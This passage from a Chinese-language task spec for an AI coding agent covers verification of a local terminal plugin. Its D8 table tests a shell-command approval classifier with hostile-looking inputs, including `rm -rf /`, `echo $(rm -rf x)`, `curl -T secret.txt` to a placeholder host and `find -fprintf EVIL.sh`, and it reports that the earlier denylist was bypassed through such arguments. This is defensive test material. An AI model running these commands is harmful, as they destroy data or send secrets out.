"C:/Users/41807/.cache/magpie/bun/1.4.5/magpie-bun.exe" -e '
import("C:/Users/41807/magpie-terminal/index.mjs").then(async m => {
  await m.default.server({}, {port: 3480});
  const home = await fetch("http://127.0.0.1:3480/");
  const cookie = (home.headers.get("set-cookie") || "").split(";")[0];
  const r = await fetch("http://127.0.0.1:3480/api/health", { headers: { cookie } });
  console.log("HEALTH", r.status, await r.text());
  process.exit(0);
}).catch(e => { console.error("BUN_FAIL", e); process.exit(1); });'
```

必须 `HEALTH 200` 且 `pty:"native"`（**这决定插件在宿主里能不能活**）。跑完确认 3480 上没有残留进程。

> 契约说明：`/api/health` 和其他 `/api/*` 一样要过 token（见 §4.5 与 §5 D2 第 1 条）。所以本段必须先从 `GET /` 拿 `mt` cookie 再问健康接口 —— **不要为了「让脚本好写」把 `/api/health` 开成免鉴权**，那会让 D2 第 1 条失效。

### D6 直接驱动一次真实 HTTP 会话（证明页面契约成立）

```bash
node -e '
const r = await fetch("http://127.0.0.1:3480/?theme=dark&tokens=" + encodeURIComponent(Buffer.from(JSON.stringify({"--magpie-bg":"#111"})).toString("base64")));
const html = await r.text();
console.log("STATUS", r.status, "COOKIE", /mt=[0-9a-f]{64}/.test(r.headers.get("set-cookie")||""));
console.log("HAS_INLINE_SCRIPT", /<script(?![^>]*src=)[^>]*>[\s\S]*?<\/script>/.test(html));
console.log("HAS_ROOT_VARS", html.includes("--magpie-bg"));
console.log("HAS_CSP", (r.headers.get("content-security-policy")||"").includes("default-src \x27none\x27"));
'
```

期望：`STATUS 200`、`COOKIE true`、`HAS_INLINE_SCRIPT false`、`HAS_ROOT_VARS true`、`HAS_CSP true`。

### D7 本轮返工专项（缺陷 A / B / D）

这三条是主验收方用真 Chrome（CDP 驱动键盘）+ 真 WS 探针实测出来的使用失败级缺陷，**修完必须贴真实输出**。

**D7-1 打开即自动建首个标签（缺陷 A）**
断言三件事（用你自己的探针脚本，贴真实输出）：
1. **页面行为**：`app.js` 在 WS `open` 且 store 零会话时发出 `pty.create`（读代码 + 真浏览器验证：新页面加载后 `__termDebug().sessions.length === 1`）。**不要**靠服务端替客户端建会话凑这个数——那样任何探针连一下 WS 都会多一个 shell。
2. **重连不重复建**：store 非空时连上不再发 `pty.create`，`sessions` 不增加。
3. **服务端不越权**：一条只连 WS、什么都不发的连接，等 500ms 后 `/api/health` 的 `sessions` **必须不变**（这条专门防「服务端自动建」的实现方式）。

**D7-2 主题变量真的生效（缺陷 B）**
```bash
node -e '
const r = await fetch("http://127.0.0.1:3480/?theme=dark&tokens=" + encodeURIComponent(Buffer.from(JSON.stringify({"--magpie-bg":"#1e1e2e"})).toString("base64")));
const csp = r.headers.get("content-security-policy") || "";
console.log("STYLE_UNSAFE", /style-src[^;]*unsafe-inline/.test(csp));
'
```
断言 `STYLE_UNSAFE true`。**并且**要在真浏览器里证明计算值生效（页面内 `getComputedStyle(document.documentElement).getPropertyValue("--magpie-bg")` 必须是 `#1e1e2e`，不是兜底 `Canvas`）；没有浏览器就用 `scripts/doctor.mjs` 加一条 CDP 断言，或在报告里写明「未在真浏览器验证」并说明替代证据。**不要只贴 CSP 字符串就说修好了。**

**D7-3 断连回收与重连保留（缺陷 D）**
```bash
# 1) 建会话 → 直接 socket.destroy()（不是 close(1000)）→ 等 12 秒 → 查
#    http://127.0.0.1:3480/api/health 的 sessions 必须回到 0
# 2) 建会话 → socket.destroy() → 2 秒内新连接发 pty.attach{id} → 必须收 session.resumed，
#    且该会话仍在 /api/health 的 sessions 里
# 3) attach 一个不存在的 id → 必须收 pty.error，code 为 SESSION_GONE
```
三条都必须贴 `sessions` 的真实数字变化（建前/建后/等 12 秒后）。

### D8 分级器参数级收紧（独立核验发现的真实安全回归，**必须修**）

背景见 §4.10.1。当前实现（`src/policy/allowlist.mjs` 的 `DANGEROUS_ARGS` + `SUBCOMMAND_DANGEROUS_ARGS`）是**危险参数黑名单**，实测被绕过。改成「允许集」判定后，下面这张表**逐条**贴真实输出（`classify()` 的 `decision` + `hit`）：

| # | 命令 | 期望 decision | 期望 hit 前缀 |
|---|---|---|---|
| 1 | `find . -fprint PWNED.txt` | confirm | `deny` |
| 2 | `find . -fprintf EVIL.sh 'x'` | confirm | `deny` |
| 3 | `find . -fprint0 out.bin` | confirm | `deny` |
| 4 | `find . -fls out.txt` | confirm | `deny` |
| 5 | `find . -name "*.js" -type f` | **confirm** | `default` |
| 6 | `find . -maxdepth 2 -name "*.md"` | **confirm** | `default` |
| 7 | `find . --delete` | confirm | `deny` 或 `default` |
| 8 | `git branch side-effect-branch` | confirm | `deny` |
| 9 | `git branch -f x HEAD` | confirm | `deny` |
| 10 | `git branch --unset-upstream` | confirm | `deny` |
| 11 | `git branch -a` | auto | `allow` |
| 12 | `git branch --show-current` | auto | `allow` |
| 13 | `git status` | auto | `allow` |
| 14 | `git log --oneline -5` | auto | `allow` |
| 15 | `curl -I http://127.0.0.1:3425/` | auto | `allow` |
| 16 | `curl -I -T secret.txt http://x/` | confirm | `deny` |
| 17 | `curl -I -K evil.cfg` | confirm | `deny` |
| 18 | `curl -I -D hdr.txt http://x/` | confirm | `deny` |
| 19 | `wc -l README.md` | auto | `allow` |
| 20 | `wc -l --files0-from=list` | auto | `allow` |
| 21 | `rg --pre ./p x` | confirm | `deny` |
| 22 | `rg -n "TODO" src` | auto | `allow` |
| 23 | `ls -la` | auto | `allow` |
| 24 | `rm -rf /` | confirm | `deny` |
| 25 | `echo $(rm -rf x)` | confirm | `substitution` |

**另外三条硬要求**：

1. **对称性**：`-delete` 与 `--delete`、`-fprint` 与 `--fprint`（GNU 不接受但也要按同名单处理）判定必须一致；不许只匹配短选项。测试里加一条「短/长选项同名判定相同」的用例。
2. **只有 `find` 允许整条移除**（§4.10.1 第 1 条）。`curl -I`、`git branch`、`rg`、`wc` 不许整条删掉——它们是每天的核心用法，要按允许集实现，不是删功能。
3. **新增用例进 `test/policy/classify.test.mjs`**，不许改已有用例期望；上表 25 条至少覆盖 20 条（其余可归到等价参数组）。

### D9 核验中发现的三个小缺陷（顺手修，别扩大范围）

1. **`/favicon.ico` 404**：真 Chrome 打开应用页控制台必有一条 `Failed to load resource: … 404`。在 `app/index.html` 的 `<head>` 加一个内联 data URI 图标（`<link rel="icon" href="data:image/svg+xml,...">`，**不许**改成请求外部文件、不许加网络请求），或让服务端对 `/favicon.ico` 返回 204。任选一种，贴「控制台无 404」的真实输出。
2. **`test/pty/session.test.mjs` 里 resize 后连敲 10 条的用例固定 12s 超时**：本机满载时（`node --test` 11 次并发）会假失败，实测真实耗时波动到 7.49s。把这类等待改成「轮询到 20s 上限、命中即返回」，不要写成「睡固定 12s 再断言」。
3. **`scripts/doctor.mjs` 的 `finally` 吞异常**：第 5 步 12s 超时被伪装成第 8 步 `orphans` 失败（`actual={"checked":0,...}`），排查时严重误导。`finally` 里不得吞掉 try 里的异常；超时要作为自己的失败项报出来（`code: "STEP_TIMEOUT"`）。

---

## 6. 禁止清单

- 不许 `npm install`（依赖已就位）、不许下载 xterm、不许改 `app/vendor/xterm/*.js`
- 不许运行 `magpie` 任何子命令、不许改 `C:\Users\41807\.config\magpie\`
- 不许 `git add` / `git commit` / 建分支（提交由验收方做）
- 不许改 `docs/`、`.trellis/spec/`、`LICENSE`、`.gitignore`
- 不许注册 `SIGINT`/`SIGTERM`、不许实现 `stop()`
- 不许 `writeHead(403)` 处理 WS 升级
- 不许 `0.0.0.0`、不许端口顺延、不许把 token 写盘或进日志
- 不许在 `src/policy` 里做 IO、不许 `catch` 后返回 `"auto"`
- 不许用 curl 断言 AI 链路（会被 403）
- 不许把 `max_tokens` 设小于 1024
- 不许留下 `TODO` / `TBD` / `FIXME` / 空函数占位
- **不许为了让验收通过去改 `docs/`、`.trellis/spec/`、`TASK.md` 的验收口径**（本轮返工已由验收方把缺口补进 TASK.md 与 spec，你只按新口径改代码）
- **不许改 `test/` 里已有用例的期望值来迁就实现**；新行为只能新增用例

---

## 7. 报告要求

写 `REPORT.md` 到仓库根，包含：

1. 逐条 D0–D6 的**真实命令与真实输出**（不是「通过了」）
2. 每条断言的实际值（`doctor-report.json` 路径）
3. 与规范的偏差清单（若必须偏离某条规范，写明哪条、为什么、影响）
4. 未完成项与已知限制（例如：页面在 Wails WebView2 里是否真的画出来，无法在此环境验证）
5. `nodePtyVersion` 实测值、实际使用的 shell 路径与版本、`/api/health` 的完整 JSON

回答我时只给：改了什么、跑了什么、结果如何、还剩什么。不要贴大段代码。
